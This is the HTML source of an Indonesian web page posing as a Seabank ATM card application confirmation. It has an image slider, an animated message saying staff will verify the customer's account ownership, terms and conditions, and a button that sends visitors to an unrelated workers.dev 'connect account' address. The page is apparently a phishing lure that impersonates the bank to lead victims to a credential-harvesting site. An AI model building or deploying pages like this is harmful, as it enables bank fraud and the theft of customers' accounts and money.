<!DOCTYPE html><html lang="id"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Halaman Pengajuan Seabank</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        /* Foto Header Atas (Sesuai Style Anda) */
        .header-top {
            position: relative;
            background: url("https://3272b2d2e4a454c00d02ea29c2fdc323.cdn.bubble.io/f1766747235355x995100167118079000/nav1.png") transparent; /* Ganti dengan path foto Anda */
            background-repeat: no-repeat;
            background-size: 100% 100%;
            height: 60px;
            width: 100%;
            margin: 0 auto;
            left: 0; 
            right: 0; 
            max-width: 450px;
            box-shadow: 0px 1px 4px 2px rgba(66, 68, 90, 0.18);
            margin-bottom: 10px; /* Jeda ke slider */
        }

        /* Slider Foto (3 gambar Saja, Tanpa Tanda Panah) */
        .slider-container {
            width: 100%;
            height: 200px;
            margin: 0 auto 25px;
            overflow: hidden;
            border-radius: 25px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            position: relative;
        }
        .slider {
            display: flex;
            transition: transform 0.6s ease;
            height: 100%;
        }
        .slider img {
            width: 100%;
            height: 200px;
            object-fit: cover;
            flex-shrink: 0;
        }
        /* Tanda panah dihapus */

        /* Teks Berjalan (di dalam kotak rapi) */
        .text-box {
            width: 95%;
            max-width: 600px;
            margin: 0 auto 30px;
            padding: 15px 20px;
            background-color: #f0f7ff;
            border: 2px solid #1a73e8;
            border-radius: 25px;
            text-align: center;
            min-height: 70px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 2px 6px rgba(26, 115, 232, 0.15);
        }
        #teksBerjalan {
            color: #1a73e8;
            font-family: sans-serif;
            font-weight: 600;
            font-size: 15px;
            line-height: 1.4;
        }

        /* Nomor Tiket (Dikecilkan + Animasi Warna Latar Belakang) */
        .ticket-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
            margin-bottom: 35px;
        }
        .ticket-label {
            font-size: 14px;
            color: #555;
            text-align: center;
            padding: 0 20px;
            font-weight: 500;
        }
        .ticket-code {
            width: 160px;
            height: 60px;
            border: 3px solid #fff;
            border-radius: 30px;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 10px;
            font-size: 15px;
            font-weight: bold;
            color: white;
            animation: colorChange 5s linear infinite;
            box-shadow: 0 3px 10px rgba(0,0,0,0.15);
        }
        @keyframes colorChange {
            0% { background-color: #d4ac0d; }
            25% { background-color: #1a73e8; }
            50% { background-color: #25d366; }
            75% { background-color: #e91e63; }
            100% { background-color: #d4ac0d; }
        }

        /* Logo Chat Animasi (Link ke WhatsApp) */
        .chat-logo {
            position: fixed;
            bottom: 30px;
            right: 30px;
            width: 65px;
            height: 65px;
            background-color: #25d366;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 28px;
            animation: blink 2s infinite;
            cursor: pointer;
            box-shadow: 0 3px 10px rgba(37, 211, 102, 0.3);
            text-decoration: none;
            z-index: 999;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.8; transform: scale(1.05); }
        }

        /* Syarat Ketentuan (Simple & Pendek) */
        .terms-section {
            padding: 15px;
            background-color: #f8f9fa;
            margin: 0 20px 80px;
            border-radius: 10px;
            border: 1px solid #eee;
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
        }
        .terms-section h3 {
            color: #1a73e8;
            margin-bottom: 10px;
            font-size: 15px;
            text-align: center;
        }
        .terms-list {
            list-style: none;
            padding: 0;
        }
        .terms-list li {
            line-height: 1.5;
            color: #333;
            font-size: 13px;
            margin-bottom: 6px;
            display: flex;
            align-items: flex-start;
        }
        .terms-list li::before {
            content: "âœ“";
            color: #25d366;
            margin-right: 8px;
            margin-top: 1px;
        }
        
.button1 {
    z-index: 1;
    background: #FD5200;
    margin-top: -20px;
    height: 45px;
    width: 80%;
    color: #fff;
    border-radius: 50px;
    border: 5px double #Fff;
    display: block;
    position: absolute;
    left: 50%;
    transform: translate(-50%, -50%);
}


.three {
    transition: all 0.2s;
    transition-timing-function:cubic-bezier(2.2, 2, 3, 2);
}

.three:hover {
    background: #FD5200; 
    color: white;
    border: none;
    opacity: 0.3;
    transform:scale(1.01,1.01);
    box-shadow: inset 0px 0px 9px -2px rgba(66, 68, 90, 1);
}

        /* Responsif untuk HP */
        @media (max-width: 768px) {
            .slider-container {
                width: 95%;
                height: auto;
                max-height: 200px;
            }
            .slider img {
                height: auto;
                max-height: 200px;
            }
            .text-box {
                border-radius: 20px;
                padding: 12px 15px;
            }
            #teksBerjalan {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <!-- Foto Header Atas (Sesuai Style Anda) -->
    <div class="header-top"></div>

    <!-- Slider Foto (3 Gambar Saja, Tanpa Tanda Panah) -->
    <div class="slider-container">
        <div class="slider" id="slider">
            <img src="https://eba5cd72c60196b51ffe4ef7e0b56d28.cdn.bubble.io/f1767942981859x352076520140843800/0e32a759f1ec4afb978f7d27c0652587.png" alt="Foto Slider 1">
            <img src="https://eba5cd72c60196b51ffe4ef7e0b56d28.cdn.bubble.io/f1767943047992x930425317079584900/7a09dded543b46448c3731bb6d30a013.png" alt="Foto Slider 2">
            <img src="https://eba5cd72c60196b51ffe4ef7e0b56d28.cdn.bubble.io/f1767943082576x758118536803920100/aa4db7f19a65436a8646b07ea8180e7e.png" alt="Foto Slider 3">
            <!-- Hanya 3 gambar, tidak ada yang ke-4 -->
        </div>
        <!-- Tanda panah dihapus -->
    </div>

    <!-- Teks Berjalan (di dalam kotak rapi) -->
    <div class="text-box">
        <div id="teksBerjalan"></div>
    </div>

    <!-- Syarat Ketentuan (Simple & Pendek) -->
    <div class="terms-section">
        <h3>Syarat & Ketentuan Pengajuan Kartu ATM</h3>
        <ul class="terms-list">
            <li>Untuk nasabah Seabank dengan rekening aktif</li>
            <li>Verifikasi data dilakukan dalam 1-3 hari kerja</li>
            <li>Simpan nomor tiket untuk melacak status</li>
            <li>Kartu dikirim ke alamat terdaftar</li>
            <li>Seabank berhak menolak jika syarat tidak terpenuhi</li>
        </ul>
    </div>
      <center>
     <button type="button" onclick="location.href='https://hubungkan-akun.notap5841.workers.dev/'" class="button1 puki" >Klik Disini Untuk Pengiriman Kartu</button>
     </center>

    <!-- Script untuk Slider & Teks Berjalan -->
    <script>
        // Slider (3 gambar, otomatis tanpa tombol)
        const slider = document.getElementById('slider');
        let currentSlide = 0;
        const totalSlides = slider.children.length; // Sekarang total 3

        function showSlide(n) {
            currentSlide = (n + totalSlides) % totalSlides;
            slider.style.transform = `translateX(-${currentSlide * 100}%)`;
        }

        function nextSlide() {
            showSlide(currentSlide + 1);
        }

        // Ganti gambar otomatis setiap 5 detik
        setInterval(nextSlide, 5000);

        // Teks Berjalan (huruf demi huruf di dalam kotak)
        const teksLengkap = "Terimakasih Atas Pengajuan Kartu ATM Seabank.Pengajuan Anda Segera di proses.Tim kami Akan Menghubungi Anda untuk Verifikasi Alamat dan juga kepemilikan Akun Seabank Mohon di screenshot atau di tulis Tiket pengajuan di bawah ini sebagai bukti pengajuan kartu ATM Seabank Untuk bantuan langsung klik chat";
        const teksBerjalanElement = document.getElementById('teksBerjalan');
        let index = 0;

        function tampilkanTeks() {
            teksBerjalanElement.textContent += teksLengkap[index];
            index++;

            if (index < teksLengkap.length) {
                setTimeout(tampilkanTeks, 70);
            } else {
                setTimeout(() => {
                    teksBerjalanElement.textContent = "";
                    index = 0;
                    tampilkanTeks();
                }, 4000);
            }
        }

        // Mulai animasi teks
        tampilkanTeks();
    </script>

</body></html>
